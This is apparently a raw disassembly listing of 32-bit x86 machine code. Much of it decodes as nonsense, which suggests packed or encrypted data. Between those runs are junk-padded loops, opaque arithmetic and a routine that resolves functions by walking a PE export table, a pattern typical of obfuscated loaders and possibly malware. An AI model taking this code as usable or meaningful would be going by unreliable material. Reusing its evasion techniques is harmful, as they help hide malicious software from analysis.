  407280:	push   esi
  407281:	cmp    al,0x6b
  407283:	sub    al,0xb8
  407285:	sbb    DWORD PTR [ebp+0x3c],ebx
  407288:	sub    DWORD PTR [ecx-0xe7c28a8],eax
  40728e:	mov    ebp,0x568f051f
  407293:	xchg   edx,eax
  407294:	or     eax,0xb0305982
  407299:	pop    ds
  40729a:	lods   al,BYTE PTR ds:[esi]
  40729b:	xlat   BYTE PTR ds:[ebx]
  40729c:	or     eax,0xf029b482
  4072a1:	das    
  4072a2:	xor    bh,BYTE PTR [edx+eiz*8]
  4072a5:	sub    DWORD PTR [ebx+0x3f],0xffffffa6
  4072a9:	sar    cl,0xd9
  4072ac:	add    DWORD PTR [ecx],0x3ecd2e33
  4072b2:	jge    0x407322
  4072b4:	div    DWORD PTR [edi]
  4072b6:	mov    DWORD PTR [edi+edx*2+0x20],0x52f50f72
  4072be:	push   0x6b56c1c6
  4072c3:	add    al,0xee
  4072c5:	mov    ch,0x97
  4072c7:	xchg   esi,eax
  4072c8:	lahf   
  4072c9:	out    dx,eax
  4072ca:	sub    eax,0x19869f6d
  4072cf:	nop
  4072d0:	in     al,0x65
  4072d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072d3:	inc    ebp
  4072d4:	sub    DWORD PTR [edi*1-0x4a55fdc8],edx
  4072db:	inc    esi
  4072dc:	addr16 pop edx
  4072de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4072df:	(bad)  
  4072e0:	mov    DWORD PTR [edi+0x14],ecx
  4072e3:	bound  eax,QWORD PTR [edx*8-0x564e28f0]
  4072ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4072eb:	out    0x52,al
  4072ed:	out    dx,al
  4072ee:	out    0x66,eax
  4072f0:	cmp    al,bh
  4072f2:	mov    ds:0xd1f82b6a,eax
  4072f7:	dec    ebp
  4072f8:	shl    DWORD PTR [eax],cl
  4072fa:	mov    ds:0x888ae262,al
  4072ff:	sbb    eax,0xaae55312
  407304:	cli    
  407305:	xchg   edi,eax
  407306:	lods   al,BYTE PTR ds:[esi]
  407307:	lock vaddsubpd ymm1,ymm3,YMMWORD PTR [ebx+0x3d]
  40730d:	adc    edx,DWORD PTR [edx]
  40730f:	cmp    ebp,DWORD PTR [edi]
  407311:	fdivr  st,st(0)
  407313:	mov    DWORD PTR [ebp-0x1c],ecx
  407316:	and    DWORD PTR ds:0x4292a5,ebx
  40731c:	imul   edx,eax
  40731f:	neg    esi
  407321:	mov    ecx,0x4573
  407326:	add    edx,ecx
  407328:	mov    esi,0x7879
  40732d:	and    DWORD PTR ds:0x42c88e,0x0
  407337:	xor    edi,edi
  407339:	add    edi,DWORD PTR ds:0x42c88e
  40733f:	inc    edi
  407340:	mov    DWORD PTR ds:0x42c88e,edi
  407346:	cmp    DWORD PTR ds:0x42c88e,0x26
  40734d:	jne    0x407368
  407353:	push   0x70d3
  407358:	push   0x0
  40735a:	push   DWORD PTR [ebp-0x10]
  40735d:	push   0x5a5a
  407362:	call   DWORD PTR ds:0x427acf
  407368:	cmp    DWORD PTR ds:0x42c88e,0x19
  40736f:	jb     0x407337
  407375:	and    DWORD PTR ds:0x42c89e,0x0
  40737f:	mov    edi,DWORD PTR ds:0x42c89e
  407385:	inc    edi
  407386:	mov    DWORD PTR ds:0x42c89e,edi
  40738c:	cmp    DWORD PTR ds:0x42c89e,0xb
  407393:	jne    0x4073a5
  407399:	push   DWORD PTR [ebp-0x24]
  40739c:	push   DWORD PTR [ebp-0x14]
  40739f:	call   DWORD PTR ds:0x4279f7
  4073a5:	cmp    DWORD PTR ds:0x42c89e,0xa
  4073ac:	jne    0x4073bf
  4073b2:	mov    edi,DWORD PTR ds:0x42c89e
  4073b8:	inc    edi
  4073b9:	mov    DWORD PTR ds:0x42c89e,edi
  4073bf:	cmp    DWORD PTR ds:0x42c89e,0x1a
  4073c6:	jb     0x40737f
  4073cc:	xor    DWORD PTR ds:0x427d17,edx
  4073d2:	mov    edi,0x1556
  4073d7:	xchg   esi,ecx
  4073d9:	sub    edx,edi
  4073db:	sbb    ecx,DWORD PTR ds:0x4292d1
  4073e1:	xor    esi,esi
  4073e3:	mov    DWORD PTR [ebp-0x28],esi
  4073e6:	or     ecx,DWORD PTR ds:0x427d1f
  4073ec:	mov    DWORD PTR [ebp-0x2c],esi
  4073ef:	mov    ecx,DWORD PTR ds:0x42c886
  4073f5:	xor    DWORD PTR ds:0x42759c,ecx
  4073fb:	mov    DWORD PTR [ebp-0x14],esi
  4073fe:	and    DWORD PTR ds:0x4292c1,0x0
  407408:	jmp    0x40741c
  40740d:	xor    ecx,ecx
  40740f:	or     ecx,DWORD PTR ds:0x4292c1
  407415:	inc    ecx
  407416:	mov    DWORD PTR ds:0x4292c1,ecx
  40741c:	cmp    DWORD PTR ds:0x4292c1,0x12
  407423:	jae    0x4075d0
  407429:	cmp    DWORD PTR ds:0x4292c1,0x1e
  407430:	jne    0x40743c
  407436:	call   DWORD PTR ds:0x427ad3
  40743c:	jmp    0x40740d
  407441:	sub    ecx,0x7ae1
  407447:	jmp    0x4075d0
  40744c:	add    DWORD PTR [eax-0xd],edx
  40744f:	sbb    esp,DWORD PTR [ebp-0x5]
  407452:	cdq    
  407453:	push   0xffffffc7
  407455:	stos   BYTE PTR es:[edi],al
  407456:	cmp    eax,eax
  407458:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407459:	push   ebp
  40745a:	int3   
  40745b:	ja     0x4073e0
  40745d:	and    BYTE PTR [esp+edi*2-0x18],bh
  407461:	jg     0x4074df
  407463:	jl     0x4074be
  407465:	push   ebx
  407466:	push   ss
  407467:	add    ebx,DWORD PTR [edi-0x1c]
  40746a:	das    
  40746b:	or     al,0x2b
  40746d:	ret    0x98bd
  407470:	in     al,0x21
  407472:	or     eax,0xcc5cd7cd
  407477:	popa   
  407478:	loopne 0x4074f6
  40747a:	dec    edi
  40747b:	adc    edx,0xffffffee
  40747e:	mov    ds:0x3423b176,eax
  407483:	clc    
  407484:	and    al,0xf
  407486:	stos   DWORD PTR es:[edi],eax
  407487:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407488:	in     al,0x73
  40748a:	dec    eax
  40748b:	std    
  40748c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40748d:	(bad)  
  40748e:	xor    dl,ah
  407490:	mov    WORD PTR [edx+0x1520516c],fs
  407496:	mov    esp,0x2d8cdb35
  40749b:	inc    esi
  40749c:	int3   
  40749d:	test   al,0x26
  40749f:	pop    ecx
  4074a0:	cld    
  4074a1:	sti    
  4074a2:	pusha  
  4074a3:	ror    BYTE PTR [ebx+0x35],0x36
  4074a7:	xchg   esi,eax
  4074a8:	mov    ds:0x846cedc1,al
  4074ad:	pop    ebp
  4074ae:	sub    eax,0xb8f5b854
  4074b3:	imul   DWORD PTR [ebx-0x60]
  4074b6:	les    eax,FWORD PTR [esi]
  4074b8:	clc    
  4074b9:	xor    eax,0xcaeca094
  4074be:	or     BYTE PTR [eax+0x7119757a],0x49
  4074c5:	cmp    DWORD PTR [ebp+0x3f844396],eax
  4074cb:	int    0x28
  4074cd:	sbb    eax,0x41c8b193
  4074d2:	push   es
  4074d3:	in     al,0x96
  4074d5:	sub    ebx,edi
  4074d7:	into   
  4074d8:	aad    0xb4
  4074da:	(bad)  
  4074db:	(bad)
  4074de:	push   esp
  4074df:	mov    al,0x42
  4074e1:	test   eax,0xec124094
  4074e6:	mov    cl,0xe1
  4074e8:	xchg   ebx,eax
  4074e9:	sub    BYTE PTR ds:0xac3e73f8,ah
  4074ef:	push   edi
  4074f0:	mov    edi,0xf7879ee1
  4074f5:	inc    ebx
  4074f6:	jns    0x40753c
  4074f8:	shr    BYTE PTR [ecx+edx*1-0x24fe73f7],0x2b
  407500:	jecxz  0x407511
  407502:	hlt    
  407503:	adc    ah,bl
  407505:	pop    es
  407506:	stc    
  407507:	add    ch,cl
  407509:	retf   
  40750a:	add    al,0xcc
  40750c:	push   ebx
  40750d:	xor    eax,DWORD PTR [esi]
  40750f:	push   es
  407510:	push   edx
  407511:	push   0xa6545126
  407516:	cmp    ecx,DWORD PTR [ecx+edx*4+0x7948a546]
  40751d:	jb     0x4074af
  40751f:	aam    0x6e
  407521:	and    al,0xea
  407523:	out    0xf5,al
  407525:	push   cs
  407526:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407527:	xor    esi,DWORD PTR [edi]
  407529:	fsubr  DWORD PTR [ecx+0x73]
  40752c:	fmul   QWORD PTR [eax]
  40752e:	rcl    DWORD PTR [ecx],cl
  407530:	push   ecx
  407531:	out    dx,eax
  407532:	ins    DWORD PTR es:[edi],dx
  407533:	(bad)  
  407534:	ins    DWORD PTR es:[edi],dx
  407535:	retf   
  407536:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407537:	xor    al,0xe8
  407539:	es fs in al,dx
  40753c:	fiadd  DWORD PTR [ebp-0x52d56cb6]
  407542:	(bad)  
  407543:	mov    WORD PTR [edx+ecx*8-0x29725057],ss
  40754a:	adc    bh,BYTE PTR ds:0x9fa9b0c
  407550:	cs ds cld 
  407553:	pop    ds
  407554:	pop    ebp
  407555:	push   0x99de94dc
  40755a:	jl     0x40755b
  40755c:	int    0x8a
  40755e:	rcl    BYTE PTR [ebx],cl
  407560:	(bad)  
  407561:	mov    al,ds:0x9d3dd22c
  407566:	scas   eax,DWORD PTR es:[edi]
  407567:	hlt    
  407568:	repnz sti 
  40756a:	test   al,0x77
  40756c:	push   ebp
  40756d:	sbb    eax,0x4f2e886f
  407572:	in     al,0xe9
  407574:	into   
  407575:	dec    ebx
  407576:	shl    DWORD PTR [eax+0x452d8307],cl
  40757c:	rol    DWORD PTR [eax+0x73],1
  40757f:	in     eax,dx
  407580:	jmp    0x24c7:0x7e1f298e
  407587:	sub    al,cl
  407589:	rcl    ebp,0x35
  40758c:	adc    al,0x27
  40758e:	mov    cl,0x41
  407590:	ret    0xaea9
  407593:	xor    DWORD PTR ds:0x45a99469,ebp
  407599:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40759a:	cld    
  40759b:	mov    esi,0x6493552f
  4075a0:	fwait
  4075a1:	clc    
  4075a2:	cmc    
  4075a3:	or     dl,cl
  4075a5:	jae    0x40752a
  4075a7:	jge    0x4075d3
  4075a9:	xlat   BYTE PTR ds:[ebx]
  4075aa:	fdivr  QWORD PTR [esi+0x614604b4]
  4075b0:	retf   
  4075b1:	or     BYTE PTR [eax+0x38bc80da],dl
  4075b7:	in     eax,0xd9
  4075b9:	or     dl,BYTE PTR [edx+0x573463be]
  4075bf:	pop    es
  4075c0:	clc    
  4075c1:	inc    ecx
  4075c2:	jbe    0x407605
  4075c4:	es pop esi
  4075c6:	test   al,0x5d
  4075c8:	or     eax,DWORD PTR [ecx+0x2f386339]
  4075ce:	push   0xf875893e
  4075d3:	mov    ecx,DWORD PTR [ebp-0x18]
  4075d6:	xor    ecx,eax
  4075d8:	movzx  eax,BYTE PTR ds:0x4292bd
  4075df:	add    eax,DWORD PTR ds:0x4275b0
  4075e5:	mov    ds:0x4292bd,eax
  4075ea:	xor    edi,edi
  4075ec:	and    eax,DWORD PTR ds:0x427594
  4075f2:	jmp    0x40777b
  4075f7:	dec    cl
  4075f9:	pushf  
  4075fa:	adc    dl,BYTE PTR [edi+0x6d]
  4075fd:	repnz ins DWORD PTR es:[edi],dx
  4075ff:	xchg   esi,eax
  407600:	dec    eax
  407601:	fstp   DWORD PTR [ebp+0x15]
  407604:	mov    cl,bh
  407606:	mov    ds:0x7c7c227f,eax
  40760b:	call   0x82bcf28f
  407610:	int    0x56
  407612:	stc    
  407613:	clc    
  407614:	inc    ecx
  407615:	aad    0x48
  407617:	je     0x4075a5
  407619:	sbb    DWORD PTR [ebx],edx
  40761b:	enter  0x2591,0x57
  40761f:	inc    edx
  407620:	jo     0x4075a4
  407622:	sbb    BYTE PTR [esi-0x6bcfd57b],dh
  407628:	int3   
  407629:	mov    edx,0x77c35221
  40762e:	push   ds
  40762f:	sub    ebx,DWORD PTR [ecx]
  407631:	int3   
  407632:	cmp    BYTE PTR [edi-0x57],ah
  407635:	lahf   
  407636:	sub    DWORD PTR [esi+ebx*8+0x63de4a1e],edi
  40763d:	scas   eax,DWORD PTR es:[edi]
  40763e:	jnp    0x4075f8
  407640:	mov    bl,bl
  407642:	fdivp  st(4),st
  407644:	(bad)  
  407645:	(bad)  [ebp-0x5f]
  407648:	adc    esi,DWORD PTR [ecx+0x26]
  40764b:	pop    edi
  40764c:	push   edi
  40764d:	inc    eax
  40764e:	dec    edi
  40764f:	xlat   BYTE PTR ds:[ebx]
  407650:	mov    eax,ds:0x2d416e1f
  407655:	mov    eax,0xafe701b0
  40765a:	dec    eax
  40765b:	lods   al,BYTE PTR fs:[esi]
  40765d:	xor    eax,0x6457f3a8
  407662:	lock fdiv QWORD PTR [eax+0x6e]
  407666:	cdq    
  407667:	sbb    eax,ecx
  407669:	mov    bh,BYTE PTR [ecx]
  40766b:	sar    BYTE PTR [esi-0x40],0xc7
  40766f:	xchg   ebx,eax
  407670:	cld    
  407671:	outs   dx,BYTE PTR ds:[si]
  407673:	dec    ebp
  407674:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407675:	aad    0x1d
  407677:	fsubr  st(7),st
  407679:	stc    
  40767a:	mov    bl,BYTE PTR [ebp+0x1e947b76]
  407680:	inc    esi
  407681:	xor    edi,DWORD PTR [edi+0x51]
  407684:	mov    ecx,0xcf42ab76
  407689:	inc    esi
  40768a:	sub    al,0x35
  40768c:	ja     0x407699
  40768e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40768f:	lds    edx,FWORD PTR [eax-0x5a]
  407692:	and    BYTE PTR [edx],0xa6
  407695:	ins    DWORD PTR es:[edi],dx
  407696:	call   0x4226:0x598c94e1
  40769d:	add    al,0x55
  40769f:	dec    edx
  4076a0:	jb     0x407711
  4076a2:	in     al,0xcc
  4076a4:	imul   edx,DWORD PTR [ecx+edi*1+0x242f52a],0x60
  4076ac:	mov    ecx,DWORD PTR [edi-0x26]
  4076af:	sub    DWORD PTR [edi-0x5b980e12],esi
  4076b5:	jg     0x4076d5
  4076b7:	sub    al,BYTE PTR [edx+0x16]
  4076ba:	jo     0x4076cb
  4076bc:	push   edi
  4076bd:	leave  
  4076be:	hlt    
  4076bf:	mov    eax,0xfe29760b
  4076c4:	shl    BYTE PTR [edx],1
  4076c6:	mov    esi,0xfe94710c
  4076cb:	out    0xe8,eax
  4076cd:	push   esp
  4076ce:	(bad)  
  4076cf:	sar    BYTE PTR [esi+0x6d],cl
  4076d2:	(bad)  ss:[edi+0x10]
  4076d6:	pop    ebx
  4076d7:	mov    cl,0x51
  4076d9:	pslld  mm4,mm1
  4076dc:	in     al,0x54
  4076de:	push   ecx
  4076df:	lock (bad) 
  4076e1:	imul   edi,DWORD PTR [ecx-0x1e097ec8],0x70
  4076e8:	pop    ss
  4076e9:	or     BYTE PTR [ecx+esi*8-0x17722842],bl
  4076f0:	mov    bh,0xf9
  4076f2:	or     BYTE PTR [edi+ebp*1+0x76],ah
  4076f6:	fadd   st,st(2)
  4076f8:	xor    eax,0xd4910053
  4076fd:	pop    ds
  4076fe:	cli    
  4076ff:	lds    edx,FWORD PTR [edi-0x5d7bd4d4]
  407705:	enter  0xc828,0x3d
  407709:	jle    0x4076eb
  40770b:	xchg   ebx,eax
  40770c:	sar    esi,0xf0
  40770f:	imul   edx,DWORD PTR [ecx+0x6b],0x4c8a1e87
  407716:	or     eax,0x33743507
  40771b:	sub    edi,esp
  40771d:	scas   al,BYTE PTR es:[edi]
  40771e:	add    eax,0x21f355ec
  407723:	retf   0x75
  407726:	shl    BYTE PTR [eax+0x45ef9c2d],0x2a
  40772d:	add    bl,BYTE PTR [edx+0x6d]
  407730:	lds    ebp,FWORD PTR [edx-0x61]
  407733:	push   cs
  407734:	jp     0x407725
  407736:	cmp    ebp,DWORD PTR [ecx]
  407738:	inc    esi
  407739:	jo     0x40779a
  40773b:	sti    
  40773c:	xor    DWORD PTR [edi+0x74],0x7c
  407740:	mov    eax,ds:0x3307b71d
  407745:	dec    edx
  407746:	cli    
  407747:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407749:	rol    esi,0xaa
  40774c:	add    esi,DWORD PTR cs:[edi-0x1b]
  407750:	dec    ebx
  407751:	dec    ebx
  407752:	push   cs
  407753:	retf   
  407754:	mov    cl,0x60
  407756:	adc    DWORD PTR [ebx+ecx*1+0x7d4499ac],ebx
  40775d:	sub    ecx,eax
  40775f:	clc    
  407760:	(bad)  
  407761:	mov    bh,0x8d
  407763:	ret    0x6e9e
  407766:	loopne 0x407793
  407768:	dec    edi
  407769:	and    al,0xe6
  40776b:	in     eax,0xd3
  40776d:	push   edi
  40776e:	jo     0x4077b7
  407770:	shr    DWORD PTR [ecx+0x49],0x6b
  407774:	ret    0x77c2
  407777:	mov    dh,0xfa
  407779:	(bad)  
  40777a:	mov    ch,0x3
  40777c:	retf   
  40777d:	mov    DWORD PTR [ebp-0x20],ecx
  407780:	mov    eax,DWORD PTR [ebp-0x20]
  407783:	je     0x407a73
  407789:	and    DWORD PTR ds:0x42c882,0x0
  407793:	xor    eax,eax
  407795:	xor    eax,DWORD PTR ds:0x42c882
  40779b:	inc    eax
  40779c:	mov    ds:0x42c882,eax
  4077a1:	cmp    DWORD PTR ds:0x42c882,0x16
  4077a8:	jne    0x4077b9
  4077ae:	push   0x42785c
  4077b3:	call   DWORD PTR ds:0x427c77
  4077b9:	cmp    DWORD PTR ds:0x42c882,0x11
  4077c0:	jb     0x407793
  4077c6:	mov    eax,ds:0x42c88e
  4077cb:	xor    DWORD PTR ds:0x4292dd,eax
  4077d1:	mov    eax,DWORD PTR [ebp-0x4]
  4077d4:	xor    eax,0x7510857
  4077d9:	xor    DWORD PTR ds:0x4292c9,0x4292c1
  4077e3:	add    eax,ebx
  4077e5:	cmp    edi,eax
  4077e7:	jne    0x40788d
  4077ed:	sub    DWORD PTR ds:0x42759c,0x4275a4
  4077f7:	push   DWORD PTR [ebp+0x8]
  4077fa:	call   0x4063f7
  4077ff:	mov    DWORD PTR [ebp-0x20],eax
  407802:	xor    eax,eax
  407804:	add    eax,DWORD PTR ds:0x4292f5
  40780a:	xor    esi,esi
  40780c:	xor    esi,DWORD PTR ds:0x4278af
  407812:	sub    esi,eax
  407814:	sub    eax,DWORD PTR [eax+esi*1]
  407817:	mov    eax,DWORD PTR [ebp-0x4]
  40781a:	sub    esi,DWORD PTR ds:0x42c896
  407820:	mov    ecx,DWORD PTR [ebp-0x20]
  407823:	mov    esi,0x7510857
  407828:	xor    eax,esi
  40782a:	adc    DWORD PTR ds:0x4292b9,0x7173
  407834:	add    eax,ebx
  407836:	cmp    ecx,eax
  407838:	je     0x407a57
  40783e:	push   DWORD PTR [ebp-0x20]
  407841:	push   DWORD PTR [ebp+0x8]
  407844:	call   0x4064f3
  407849:	mov    DWORD PTR [ebp-0x14],eax
  40784c:	mov    eax,DWORD PTR [ebp-0x4]
  40784f:	mov    ecx,DWORD PTR [ebp-0x14]
  407852:	xor    eax,esi
  407854:	add    eax,ebx
  407856:	cmp    ecx,eax
  407858:	je     0x407a57
  40785e:	mov    eax,DWORD PTR [ebp-0x14]
  407861:	mov    eax,DWORD PTR [eax+0x18]
  407864:	mov    DWORD PTR [ebp-0x20],eax
  407867:	mov    eax,DWORD PTR [ebp-0x14]
  40786a:	mov    ecx,DWORD PTR [ebp+0x8]
  40786d:	add    ecx,DWORD PTR [eax+0x20]
  407870:	mov    DWORD PTR [ebp-0x28],ecx
  407873:	mov    eax,DWORD PTR [ebp-0x14]
  407876:	mov    ecx,DWORD PTR [ebp+0x8]
  407879:	add    ecx,DWORD PTR [eax+0x24]
  40787c:	mov    DWORD PTR [ebp-0x2c],ecx
  40787f:	mov    eax,DWORD PTR [ebp-0x14]
  407882:	mov    ecx,DWORD PTR [ebp+0x8]
  407885:	add    ecx,DWORD PTR [eax+0x1c]
  407888:	xor    esi,esi
  40788a:	mov    DWORD PTR [ebp-0x14],ecx
  40788d:	mov    eax,DWORD PTR [ebp-0x28]
  407890:	mov    ecx,DWORD PTR [ebp+0x8]
  407893:	add    ecx,DWORD PTR [eax+edi*4]
  407896:	lea    eax,[ebp-0x8]
  407899:	mov    DWORD PTR [ebp-0x30],ecx
  40789c:	push   eax
  40789d:	push   DWORD PTR [ebp-0x30]
  4078a0:	push   DWORD PTR [ebp+0xc]
  4078a3:	call   0x403932
  4078a8:	mov    eax,DWORD PTR [ebp-0x4]
  4078ab:	mov    ecx,DWORD PTR [ebp-0x8]
  4078ae:	xor    eax,0x7510857
  4078b3:	add    eax,ebx
  4078b5:	jmp    0x407a3e
  4078ba:	retf   
  4078bb:	idiv   BYTE PTR [edi+0x6de9b5d6]
  4078c1:	lods   eax,DWORD PTR ds:[esi]
  4078c2:	out    0xb6,al
  4078c4:	scas   eax,DWORD PTR es:[edi]
  4078c5:	xchg   DWORD PTR [ebx+0x3e],ebp
  4078c8:	ins    BYTE PTR es:[edi],dx
  4078c9:	xchg   bl,ch
  4078cb:	and    eax,0x7fe87c7c
  4078d0:	jl     0x40794e
  4078d2:	jbe    0x40791f
  4078d4:	inc    esi
  4078d5:	sub    al,0x95
  4078d7:	lea    ebp,ds:0x5cd7ff71
  4078dd:	or     BYTE PTR [ebx+esi*1+0x445dbbea],dh
  4078e4:	in     eax,0x27
  4078e6:	jne    0x4078c4
  4078e8:	sbb    esp,DWORD PTR [ebp-0xda3a2bc]
  4078ee:	push   ds
  4078ef:	das    
  4078f0:	add    edx,DWORD PTR [edi+0x2295e3f3]
  4078f6:	shl    DWORD PTR [eax+eiz*2],0xe0
  4078fa:	loope  0x40789f
  4078fc:	cs nop
  4078fe:	fimul  DWORD PTR [ebx+0x1e]
  407901:	cdq    
  407902:	sbb    esi,DWORD PTR [edx+edx*4]
  407905:	and    DWORD PTR [eax-0x5c],0x70
  407909:	push   edi
  40790a:	out    0xde,al
  40790c:	imul   ecx,DWORD PTR ds:0xd1267070,0x82bf9fa8
  407916:	jmp    0x4078d5
  407918:	ror    BYTE PTR [edi+0x606972],1
  40791e:	inc    edx
  40791f:	add    DWORD PTR [ebx+0x46],esp
  407922:	mov    ds:0x16f1389,eax
  407927:	mov    al,0xef
  407929:	lock pusha 
  40792b:	jae    0x4078ad
  40792d:	xchg   esi,eax
  40792e:	not    BYTE PTR fs:[ecx]
  407931:	lods   al,BYTE PTR ds:[esi]
  407932:	bound  ecx,QWORD PTR [edi+0x36]
  407935:	dec    esi
  407936:	inc    ebp
  407937:	mov    al,0x98
  407939:	jbe    0x4078ff
  40793b:	push   eax
  40793c:	mov    ebp,DWORD PTR [ecx+ecx*4]
  40793f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407940:	pop    ss
  407941:	bound  edi,QWORD PTR [edi]
  407943:	pop    esi
  407944:	xor    BYTE PTR [edi+0xfbacfeb],cl
  40794a:	jb     0x4078d9
  40794c:	das    
  40794d:	dec    eax
  40794e:	cmp    al,0xe
  407950:	lods   al,BYTE PTR ds:[esi]
  407951:	fist   WORD PTR [ebx-0x51c454aa]
  407957:	lahf   
  407958:	ins    DWORD PTR es:[edi],dx
  407959:	leave  
  40795a:	mov    dh,0x90
  40795c:	xchg   DWORD PTR [ebp*4+0x3b477c3],edx
  407963:	mov    al,ds:0x4a59907
  407968:	fisttp DWORD PTR [ebx+0x6a4be15]
  40796e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40796f:	pusha  
  407970:	push   ecx
  407971:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407972:	repnz stc 
  407974:	(bad)  
  407975:	aaa    
  407976:	aam    0xac
  407978:	cmp    DWORD PTR [edi-0x53],esp
  40797b:	imul   DWORD PTR [edx+0x44356931]
  407981:	push   eax
  407982:	push   ecx
  407983:	call   0xa0c5d14f
  407988:	adc    DWORD PTR [edi+edi*8-0x20a3b158],edx
  40798f:	gs ud0 edi,ecx
  407993:	xchg   esp,eax
  407994:	jl     0x40798c
  407996:	xor    DWORD PTR [ecx+0x4b],0xffffffb7
  40799a:	in     al,0xab
  40799c:	dec    ebp
  40799d:	mov    eax,0xf543cb24
  4079a2:	in     al,dx
  4079a3:	in     al,0xeb
  4079a5:	fisttp WORD PTR [esi+0x5a]
  4079a8:	popa   
  4079a9:	retf   0xbcb
  4079ac:	xchg   esi,eax
  4079ad:	add    cl,BYTE PTR [edi-0x76]
  4079b0:	inc    esi
  4079b1:	mov    DWORD PTR [ecx+0x6970f6],0x6368b839
  4079bb:	clc    
  4079bc:	add    al,0x80
  4079be:	into   
  4079bf:	shr    DWORD PTR [ecx-0x6bbd0f3e],0xf3
  4079c6:	mov    ebx,0xbcdd622f
  4079cb:	pop    ecx
  4079cc:	lock or al,0xae
  4079cf:	sahf   
  4079d0:	add    al,0x6a
  4079d2:	addr16 add eax,0xa6a65a71
  4079d8:	inc    edi
  4079d9:	outs   dx,BYTE PTR ds:[esi]
  4079da:	out    dx,eax
  4079db:	retf   
  4079dc:	fiadd  DWORD PTR ds:0xd116944
  4079e2:	loopne 0x407987
  4079e4:	into   
  4079e5:	xor    DWORD PTR [esi+0x3337b253],eax
  4079eb:	xchg   ebp,eax
  4079ec:	jno    0x4079b7
  4079ee:	(bad)  
  4079ef:	fadd   DWORD PTR [eax+0xed91c6e]
  4079f5:	cmp    ah,BYTE PTR [ebx-0x41c5486e]
  4079fb:	lods   al,BYTE PTR ds:[esi]
  4079fc:	rcl    BYTE PTR [esi-0x58022a5a],0x85
  407a03:	shr    DWORD PTR [edx-0x7454a857],1
  407a09:	int3   
  407a0a:	fs je  0x407a3b
  407a0d:	dec    esp
  407a0e:	push   es
  407a0f:	fs jmp 0x69917df7
  407a15:	pop    esp
  407a16:	push   edx
  407a17:	cs clc 
  407a19:	retf   0xec6
  407a1c:	in     al,dx
  407a1d:	stos   BYTE PTR es:[edi],al
  407a1e:	daa    
  407a1f:	adc    edi,0xffffffa4
  407a22:	push   esi
  407a23:	or     al,0xcd
  407a25:	clc    
  407a26:	arpl   WORD PTR [ecx-0x16debe0],ax
  407a2c:	adc    esi,0xffffffdd
  407a2f:	js     0x407a46
  407a31:	pop    esi
  407a32:	call   0xea7f:0x34a17094
  407a39:	xchg   ebp,eax
  407a3a:	push   0x3b33877c
  407a3f:	enter  0x850f,0x1d
  407a43:	add    BYTE PTR [eax],al
  407a45:	add    BYTE PTR [ebx+0x3b47e045],cl
  407a4b:	clc    
  407a4c:	jb     0x407789
  407a52:	jmp    0x407a73
  407a57:	mov    eax,DWORD PTR [ebp-0x4]
  407a5a:	xor    eax,esi
  407a5c:	add    eax,ebx
  407a5e:	jmp    0x408b1b
  407a63:	mov    eax,DWORD PTR [ebp-0x2c]
  407a66:	movzx  eax,WORD PTR [eax+edi*2]
  407a6a:	mov    ecx,DWORD PTR [ebp-0x14]
  407a6d:	mov    eax,DWORD PTR [ecx+eax*4]
  407a70:	mov    DWORD PTR [ebp+0xc],eax
  407a73:	mov    eax,DWORD PTR [ebp-0x4]
  407a76:	mov    ecx,DWORD PTR [ebp-0x8]
  407a79:	xor    eax,0x7510857
  407a7e:	add    eax,ebx
  407a80:	cmp    ecx,eax
  407a82:	jne    0x407a95
  407a88:	mov    eax,DWORD PTR [ebp-0x4]
  407a8b:	xor    eax,0x7510857
  407a90:	jmp    0x407a5c
  407a95:	mov    eax,DWORD PTR [ebp+0xc]
  407a98:	add    eax,DWORD PTR [ebp+0x8]
  407a9b:	mov    DWORD PTR [ebp-0x10],eax
  407a9e:	mov    eax,DWORD PTR [ebp-0x1c]
  407aa1:	test   eax,eax
  407aa3:	je     0x4087bb
  407aa9:	mov    DWORD PTR [ebp-0x24],esi
  407aac:	push   0xb
  407aae:	pop    ecx
  407aaf:	push   0x5
  407ab1:	dec    ecx
  407ab2:	pop    ebx
  407ab3:	xchg   ebx,ecx
  407ab5:	sub    ebx,ecx
  407ab7:	xchg   ebx,ecx
  407ab9:	dec    ecx
  407aba:	jmp    0x407c43
  407abf:	adc    edi,DWORD PTR [eax+0x2d9d7285]
  407ac5:	mov    ds:0xbdc820bd,eax
  407aca:	inc    edx
  407acb:	push   ds
  407acc:	adc    eax,edx
  407ace:	ja     0x407b17
  407ad0:	and    al,0x7c
  407ad2:	jl     0x407abc
  407ad4:	jg     0x407b52
  407ad6:	jl     0x407b38
  407ad8:	stos   DWORD PTR es:[edi],eax
  407ad9:	loop   0x407a82
  407adb:	jmp    0xe8a6:0x978c9fc3
  407ae2:	mov    eax,ds:0xc93e2c5f
  407ae7:	gs mov esi,ebp
  407aea:	push   ebx
  407aeb:	shl    DWORD PTR [ebp-0x2],cl
  407aee:	push   cs
  407aef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407af0:	fiadd  WORD PTR [edx]
  407af2:	dec    esi
  407af3:	shl    DWORD PTR ds:0x8f8a3419,cl
  407af9:	test   ecx,esp
  407afb:	mov    ds:0x4c20dbe4,eax
  407b00:	aad    0xd6
  407b02:	scas   eax,DWORD PTR es:[edi]
  407b03:	test   edx,edi
  407b05:	mov    ah,0x5f
  407b07:	xor    bh,dl
  407b09:	loop   0x407b0a
  407b0b:	sbb    dh,BYTE PTR [edx+ecx*8]
  407b0e:	daa    
  407b0f:	push   edx
  407b10:	jmp    0x745b:0x9beeded9
  407b17:	or     eax,0xe61e3c47
  407b1c:	and    al,0xad
  407b1e:	out    dx,eax
  407b1f:	jecxz  0x407adb
  407b21:	sub    edi,DWORD PTR [edx+ebp*4]
  407b24:	out    dx,eax
  407b25:	or     dh,ch
